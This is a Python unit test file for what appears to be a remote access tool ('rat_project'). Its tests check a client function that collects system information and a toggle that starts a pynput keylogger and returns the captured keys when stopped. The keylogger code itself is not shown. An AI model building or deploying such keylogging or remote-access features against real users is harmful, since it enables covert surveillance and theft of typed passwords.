from unittest.mock import MagicMock, patch

from rat_project.client.client_actions_os import get_system_info, toggle_keylogger


def test_get_system_info_returns_string() -> None:
    result = get_system_info()

    assert isinstance(result, str)
    assert result != ""


def test_toggle_keylogger_start_returns_confirmation() -> None:
    # Given: keylogger is not running
    import rat_project.client.client_actions_os as actions

    actions._keylogger_listener = None
    actions._keylogger_buffer = []

    with patch("pynput.keyboard.Listener") as mock_listener_class:
        mock_listener = MagicMock()
        mock_listener_class.return_value = mock_listener

        result = toggle_keylogger()

    assert "started" in result.lower()
    mock_listener.start.assert_called_once()


def test_toggle_keylogger_stop_returns_captured_keys() -> None:
    # Given: keylogger is already running with buffered keys
    import rat_project.client.client_actions_os as actions

    mock_listener = MagicMock()
    actions._keylogger_listener = mock_listener
    actions._keylogger_buffer = ["h", "e", "l", "l", "o"]

    result = toggle_keylogger()

    assert "stopped" in result.lower()
    assert "hello" in result
    mock_listener.stop.assert_called_once()
    assert actions._keylogger_listener is None
    assert actions._keylogger_buffer == []
